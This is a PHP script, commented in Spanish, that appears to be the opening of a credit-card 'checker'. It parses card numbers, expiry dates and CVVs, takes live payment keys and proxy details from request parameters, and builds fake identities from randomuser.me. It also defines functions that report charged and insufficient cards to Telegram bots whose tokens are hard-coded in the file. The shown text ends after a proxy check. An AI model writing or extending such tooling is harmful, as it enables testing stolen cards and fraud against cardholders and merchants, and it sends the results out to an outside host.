<?php
// Desactivar la notificación de errores
error_reporting(0);

// Recuperar variables GET
$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$ip = $_GET['ip'];
$port = $_GET['port'];
$email = $_GET['email'];
date_default_timezone_set('Asia/Manila');

// Función para enviar mensajes a través de la API de Telegram cuando hay un cargo exitoso
function forwardCharged($text) {
    $encodedText = urlencode($text);
    file_get_contents("Xhttps://api.telegram.org/bot6006674467:AAGDGydc-FYGE548xyKFUGGOb-LfUIuNqwA/sendMessage?chat_id=5314609497X&text=$encodedText");
}

// Función para enviar mensajes a través de la API de Telegram cuando hay un cargo insuficiente
function forwardInsuff($text) {
    $encodedText = urlencode($text);
    file_get_contents("Xhttps://api.telegram.org/bot5918559679:AAEBIHaQ-zenP4icy6l4vBu26wA_j_VmdHI/sendMessage?chat_id=5314609497X&text=$encodedText");
}

// Función para separar una cadena en múltiples delimitadores
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};

// Obtener datos de la tarjeta de crédito
$card = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $card)[0];
$mm = multiexplode(array(":", "|", ""), $card)[1];
$yy = multiexplode(array(":", "|", ""), $card)[2];
$cvv = multiexplode(array(":", "|", ""), $card)[3];

// Asegurar que el mes y el año tengan el formato correcto
if (strlen($mm) == 1) $mm = "0$mm";
if (strlen($yy) == 2) $yy = "20$yy";

// Función para codificar XOR
function xor_encode($plaintext) {
    $key = array(5);
    $key_length = count($key);
    $plaintext_length = strlen($plaintext);
    $ciphertext = '';

    for ($i = 0; $i < $plaintext_length; $i++) {
        $ciphertext .= chr(ord($plaintext[$i]) ^ $key[$i % $key_length]);
    }

    return $ciphertext;
}

// Función para codificar en base64
function encode_base64($text) {
    $encoded_bytes = base64_encode($text);
    $encoded_text = str_replace(array("/", "+"), array("%2F", "%2B"), $encoded_bytes);
    return $encoded_text;
}

// Función para obtener una cadena codificada en JS
function get_js_encoded_string($pm) {
    $pm_encoded = xor_encode($pm);
    $base64_encoded = encode_base64($pm_encoded);
    return $base64_encoded . "eCUl";
}

// Función para extraer una subcadena entre dos delimitadores
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

// Obtener información aleatoria del usuario
$curl = curl_init();
$url = "https://randomuser.me/api/0.8/?results=1";
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
if ($response === false) {
    die("Error: " . curl_error($curl));
}
curl_close($curl);
$data = json_decode($response, true);
$fname = ucfirst($data['results'][0]['user']['name']['first']);
$lname = ucfirst($data['results'][0]['user']['name']['last']);
$street = ucfirst($data['results'][0]['user']['location']['street']);
$randomNumber = sprintf("%04d", mt_rand(0, 9999));
$remail = strtolower($fname . '.' . $lname . $randomNumber . '@gmail.com');

// Comprobar la conexión del proxy
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt_array($ch, array(CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$ips = curl_exec($ch);
curl_close($ch);

// Revisar si el proxy está muerto
if (empty($ips)) {
    echo '<span class="badge bg-danger"><b>DECLINED '.$card.' </span><b>➔ <span class="badge bg-danger"> PROXY DEAD</b></span><br>';
    exit();
}
?>
